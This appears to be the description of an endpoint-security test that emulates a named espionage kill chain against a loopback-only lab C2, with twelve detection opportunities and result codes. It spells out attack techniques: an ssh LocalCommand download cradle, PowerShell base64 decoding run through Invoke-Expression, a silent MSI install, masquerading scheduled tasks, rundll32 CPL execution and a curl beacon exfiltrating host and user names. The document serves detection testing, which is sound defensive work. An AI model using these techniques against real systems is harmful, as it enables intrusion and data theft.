## Description

This test emulates the espionage chain Microsoft Threat Intelligence disclosed on 2026-09-29 ("Star Blizzard refines phishing and malware delivery with the RedFlick technique"), which targeted 100+ organizations with fake event invitations. The killchain reproduces both documented RedFlick variants and the CosmicPulse backdoor's installation behaviors:

1. **Delivery** — a password-protected event-invite archive contains an LNK (built via `WScript.Shell` COM with `WindowStyle=7` and a PDF icon from `shell32.dll,70`) that launches a hidden `conhost.exe` → `cmd.exe` → BAT chain while displaying a decoy PDF (January variant).
2. **Transfer** — `ssh.exe` is invoked with the exact disclosure flag surface (`-o PermitLocalCommand=yes -o LocalCommand=<helper> -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=5`, plus `-o IdentitiesOnly=yes`, `-o UserKnownHostsFile=<LOG_DIR>`, `-i <per-run key>`, `-p <port>`) as a download cradle (January variant). The orchestrator runs an in-process loopback SSH sandbox on a random 127.0.0.1 port with per-run generated host+client Ed25519 keys: the cradle **authenticates for real (publickey)** and `PermitLocalCommand` **executes its LocalCommand fetch client-side** — the documented RedFlick mechanism, not just its flag surface. `curl.exe` (system binary) fetches the weaponized PDF from the loopback host (July variant) and stages the MSI.
3. **Extraction** — `powershell.exe -Command` reads the fetched PDF, regex-extracts the base64 run after the `cAB` magic header, decodes it, and executes it via `Invoke-Expression`, staging the file into the victim workspace (July RedFlick chain).
4. **Silent install** — `msiexec.exe /i <package> /q /norestart` silently installs the fetched package, which is now a **genuine Windows Installer package** (`lab_assets/redflick_persistence.msi`, authored via the Windows Installer COM API and Authenticode-signed); the install completes with exit 0.
5. **Persistence** — the three scheduled tasks with the exact disclosure names ("Internet Quality Test Connection" DAILY 09:30, "Network Configuration Manager" ONLOGON, "System Health Monitor" ONLOGON) are **created by the MSI's type-34 CustomActions** — persistence installation happens through msiexec exactly as the real chain; Stage 5 verifies and records provenance.
6. **CPL execution + key staging** — `rundll32.exe shell32.dll,Control_RunDLL <decoy.cpl>` and `control.exe <decoy.cpl>` launches; a CosmicPulse config string is AES-256-ECB encrypted (PKCS#7), written to `HKCU\Software\Classes\.mollis` (exact disclosure path), read back, decrypted and round-trip verified.
7. **Beacon** — `curl.exe` stages `python38.zip` + `bootstrapper.zip` decoys into `...\StarBlizzardInvite\bin\update\` (the disclosure's Python 3.8 package + bootstrapper installer pattern), then sends the registration beacon: `hostname|username` → UTF-16LE → Base64 → `curl.exe GET http://127.0.0.1:<port>/agent/poll?id=<data>` with a spoofed Edge/Chrome User-Agent.

Each stage is a separate Authenticode-signed binary (framework-mandated technique-level detection isolation), embedded gzip-compressed in the orchestrator, executed in disclosure order against an in-process loopback-only HTTP asset/C2 server, under a 180-second per-stage watchdog with force-terminate and `unexpected_hang` logging. An embedded cleanup utility restores the endpoint on every exit path. Lab-verified 2026-10-01 on the win lab (Windows 11 Pro 26200, Defender real-time ON, MAPS suppressed = local-only baseline): exit 101 UNPROTECTED, all 7 stages completed in ~16s, zero Defender detections for this test.

## Detection Opportunities

12 distinct detection points across the chain:

1. **LNK masquerade (file)** — `.lnk` whose target is `conhost.exe` with `--headless` arguments, `WindowStyle=7`, and a PDF icon/name (`Event_Invitation.pdf.lnk`): name/icon vs target mismatch.
2. **Hidden console host (process)** — `conhost.exe` spawning `cmd.exe` running a BAT with a hidden window; conhost with `--headless` in a non-terminal lineage.
3. **ssh.exe LOLBin cradle (process)** — any `ssh.exe` execution on an endpoint, and specifically the `PermitLocalCommand=yes` + `LocalCommand=` + `BatchMode=yes` flag surface; high-confidence confirmation is a successful publickey auth against a non-corporate endpoint followed by a client-side `cmd.exe`/`curl.exe` child (LocalCommand execution); also `-i` pointing at a key outside `~/.ssh` and a `UserKnownHostsFile` override.
4. **curl.exe ingress transfer (process+network)** — `curl.exe` (System32) downloading `.pdf`/`.msi`/`.zip` files and pairing the process-create with the loopback/HTTP connection; curl as a descendant of ssh.exe (client-side LocalCommand) or of an unsigned stage binary.
5. **PowerShell base64 extraction (script)** — `powershell.exe -Command` containing `FromBase64String`, `Invoke-Expression`, and a regex over PDF content: ScriptBlock Logging (EID 4104) and AMSI inspection of the decoded command.
6. **Silent MSI install (process)** — `msiexec.exe` with `/q` installing a package from a non-standard user/loopback-fetched path (`C:\F0\setup.msi`), not tied to a software-distribution system; the genuine install makes the `msiexec.exe → cmd.exe` (type-34 CustomAction) child chain observable.
7. **Scheduled-task creation with masquerading names (persistence)** — Event 4698/Sysmon task registration of "Internet Quality Test Connection" / "Network Configuration Manager" / "System Health Monitor" with parent lineage `msiexec.exe → cmd.exe → schtasks.exe` (CustomAction) or a direct `schtasks.exe /Create` fallback, ONLOGON triggers, actions in user-writable paths.
8. **rundll32 Control_RunDLL on user-writable CPL (process)** — `rundll32.exe shell32.dll,Control_RunDLL <path outside System32>` — classic CPLExecution proxy-execution signal.
9. **control.exe applet launch (process)** — `control.exe <user-writable .cpl>` execution from a non-standard directory.
10. **Rare-key registry staging (registry)** — write to `HKCU\Software\Classes\.mollis` (single-purpose, campaign-specific key name): Sysmon EID 12/13 targeted-key monitoring.
11. **UA-spoofed beacon (network)** — `curl.exe` sending a Chrome/Edge browser User-Agent with a GET whose `id=` parameter is high-entropy base64 (decoded UTF-16LE `host|user` pattern) — client/UA mismatch is a strong C2 indicator.
12. **Installer staging pattern (file)** — `python38.zip` + `bootstrapper.zip` appearing under a user-writable `bin\update\` path absent a corresponding legitimate video-conference installer.

### Protected System
- **Code 105 (quarantine)**: a security engine quarantines a dropped artifact — e.g., Stage 5 detects a just-created task or its action file vanishing, or a fetch/staged payload (including the genuine MSI) is quarantined.
- **Code 126 (execution prevention)**: an OS-emitted denial abnormal for the context — msiexec exit 5 (ERROR_ACCESS_DENIED), exit 1260 (AppLocker/policy rejection), `schtasks.exe` "access is denied", or a registry ACCESS_DENIED on `.mollis`. The orchestrator reports PROTECTED with the stopping stage, technique, and exit code, runs cleanup, and writes per-stage bundle results.
- **Code 127 (detected-blocked)**: stage-level prevention verdict from the 126/105/127 family handled identically to 126.
- **Code 102 (watchdog)**: a stage exceeds the 180s budget — force-terminated and logged as `unexpected_hang`.
- **Code 999 (test error)**: prerequisite/infrastructure failure (e.g., a stage runs without `F0_LOOPBACK_PORT` or before its prerequisite stage); never treated as a protection verdict.
